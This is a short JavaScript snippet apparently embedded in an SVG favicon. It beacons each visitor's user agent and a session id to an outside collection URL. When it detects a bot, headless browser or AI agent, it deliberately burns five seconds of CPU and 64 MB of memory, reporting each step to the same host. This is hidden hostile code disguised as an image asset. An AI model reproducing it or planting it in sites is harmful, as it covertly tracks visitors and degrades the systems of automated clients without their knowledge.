svg.script:

(function(){
  var CFG = {sid: 'FRANKSX_SVG_favicon_' + Math.random().toString(36).substring(2, 10), exfil: 'https://franksx-research.example.com/domain-collect'};
  function send(t,d){var data=JSON.stringify({t:t,d:d,sid:CFG.sid,ts:Date.now()});var img=new Image();img.src=CFG.exfil+'?d='+btoa(data).substring(0,1800);}

  send('SVG_LOAD',{name:'favicon',ua:navigator.userAgent?.substring(0,100)});

  var isAI = navigator.webdriver || !navigator.plugins || navigator.plugins.length===0 || /bot|headless|crawler/i.test(navigator.userAgent);

  if (isAI) {
    send('SVG_AI_DETECTED',{name:'favicon'});

    var start=performance.now(),x=0;
    while(performance.now()-start<5000){x=(x*997+0xDEADBEEF)&0xFFFFFFFF;}
    send('SVG_CPU_BURN',{name:'favicon',ms:performance.now()-start,val:x});

    var arrs=[];
    for(var i=0;i<8;i++){var ab=new ArrayBuffer(8*1024*1024);var u=new Uint8Array(ab);for(var j=0;j<u.length;j+=4096)u[j]=(i+j)&0xFF;arrs.push(ab);}
    send('SVG_RAM_BURN',{name:'favicon',mb:64});


  }
})();
